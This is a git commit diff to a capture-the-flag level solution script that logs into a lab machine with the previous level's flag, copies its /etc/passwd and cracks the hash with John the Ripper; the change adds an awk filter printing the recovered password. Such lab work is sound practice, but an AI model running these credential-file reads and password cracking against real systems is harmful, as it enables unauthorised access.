ee8ba746b06043dcff945b1f1331e8cc818c7e4e
ciglesia <35022933+AndreIglesias@users.noreply.github.com>
2023-02-18 17:40:31 +0100

    awk printf $2

--- level01/resource/flag01.sh
+++ level01/resource/flag01.sh
@@ -4,7 +4,7 @@ if [ ! -z "$1" ];then
 	sshpass -p $(cat ../../level00/flag) scp -P 4242 level01@$1:/etc/passwd /tmp/
 	cat /tmp/passwd
 	echo -e "\nCracking with john...\n"
-	sudo john /tmp/passwd --show
+	sudo john /tmp/passwd --show | awk -F: 'NR==1 {print $2}'
 else
 	echo "Usage: ./flag01.sh <ip address>"
 fi
